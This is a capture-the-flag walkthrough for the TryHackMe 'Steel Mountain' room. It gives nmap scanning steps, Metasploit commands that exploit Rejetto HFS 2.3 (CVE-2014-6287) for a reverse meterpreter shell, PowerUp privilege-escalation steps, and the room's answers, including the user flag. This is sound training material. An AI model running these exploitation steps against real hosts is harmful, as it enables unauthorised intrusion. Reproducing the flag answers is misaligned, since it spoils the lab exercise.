# Steel Moutain Wlakthrough
### Link
- https://tryhackme.com/room/steelmountain
------------------------
### Task 1 : Introduction
- Who is the employee of the month?
    - Check the source code of the web page
    - Picture: [Steel_Moutain_1.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_1.png)
    - **Answer** : Bill Harper
------------------------
### Task 2 : Initial Access
- Scan the machine with nmap. What is the other port running a web server on?
    - sudo nmap -sC -sV -oN ./nmap_steelmountain_result 10.10.117.67
    - Picture:<br>[Steel_Moutain_2.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_2.png) <br>[Steel_Moutain_3.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_3.png)
    - **Answer** : 8080
- Take a look at the other web server. What file server is running?
    - From nmap scan, we know the port 8080 is used for another file server
        - Connect to [IP]:8080
        - Under Server Information, you have a link "HttpFileServer 2.3"
        - Click on this link and you are redirected to http://www.rejetto.com/hfs/
        - Picture: [Steel_Moutain_4.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_4.png)
        - **Answer**  : rejetto http file server
- What is the CVE number to exploit this file server?
    - Visit https://www.exploit-db.com/search
    - Search exploit for rejetto http file server 2.3
    - Picture:<br>[Steel_Moutain_5.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_5.png)<br>[Steel_Moutain_6.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_6.png)
    - **Answer** : 2014-6287
- Use Metasploit to get an initial shell. What is the user flag?
    - Start metasploit
        - msfconsole
    - find the exploit
        - search exploit rejetto
        - Picture: [Steel_Moutain_7.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_7.png)
    - Select the exploit
        - use [payload number]
        - Picture: [Steel_Moutain_8.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_8.png)
    - Check the options
        - options
        - Picture: [Steel_Moutain_9.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_9.png)
    - Indicate the remote hosts ip and port (This server run on port 8080)
        - set RHOSTS [IP]
        - set RPORT [port]
        - Picture: [Steel_Moutain_10.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_10.png)
    - Chenge the Local IP with your IP
        set LHOST [IP]
    - Execute
        - run
        - Picture: [Steel_Moutain_11.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_11.png)
    - Remeber, the machine is a Windows machine.Not all  Linux command work ^_^
    - Move to C:\Users\bill\Desktop
    - Open user.txt
    Picture: [Steel_Moutain_12.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_12.png)
    - **Answer** : ??b04763b6fcf51fcd7c13abc7db4fd365
------------------------
### Task 3 - Privilege escalation
- download the script Link: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- Upload the script through meterpreter
    - upload [path]/PowerUp.ps1
    - Picture: [Steel_Moutain_13.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_13.png)
- Load powershell
    - load powershell
    - Picture: [Steel_Moutain_14.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_13.png)
- Access powershell
    - powershell_shell
    - Picture: [Steel_Moutain_15.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_15.png)
- Execute the powershell script
    - . .\PowerUp.ps1  
- Perform a check
    - Invoke-AllChecks
    - Picture: [Steel_Moutain_16.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_16.png)
- Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
    - Picture: [Steel_Moutain_17.png](https://github.com/LNB283/THM/blob/main/EASY/Steel%20Mountain/Pictures/Steel_Mountain_16.png)
    - **Answer** : AdvancedSystemCareService9